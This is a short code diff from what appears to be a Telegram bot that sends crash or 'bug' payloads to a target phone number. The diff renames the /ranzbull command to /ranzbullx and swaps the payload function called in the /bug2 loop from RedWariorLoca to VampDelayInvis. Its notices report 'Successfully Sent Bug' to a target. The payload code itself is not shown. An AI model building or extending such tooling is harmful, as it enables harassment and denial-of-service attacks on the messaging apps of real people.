@@ -2862,7 +2862,7 @@ bot.onText(/\/ranzbull(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzbull
+┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzbullx 
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
@@ -2901,7 +2901,7 @@ bot.onText(/\/bug2(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
-        await RedWariorLoca(formatedNumber);
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -3317,7 +3317,7 @@ bot.on("callback_query", async (callbackQuery) => {
 │ 
 │ ❀ /ranzunli <number>
 │ ❀ 
-│ ❀ /ranzbull <number>
+│ ❀ /ranzbullx <number>
 │ ❀ 
 │ 
 ╰═════════════════❀
